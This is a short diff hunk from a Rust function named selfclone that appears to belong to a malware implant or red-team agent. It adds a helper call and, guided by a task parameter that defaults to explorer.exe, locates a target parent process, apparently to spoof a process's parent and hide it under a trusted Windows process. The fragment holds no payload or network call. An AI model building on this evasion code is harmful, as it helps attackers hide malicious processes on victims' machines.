@@ -294,6 +294,8 @@ pub fn selfclone(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Err
         .and_then(|v| v.as_str())
         .unwrap_or("explorer.exe");
 
+    crate::helpers::churn(parent_name);
+
     let (output, status) = unsafe {
         // Step 1: Find the target parent process
         match find_process_pid(parent_name) {
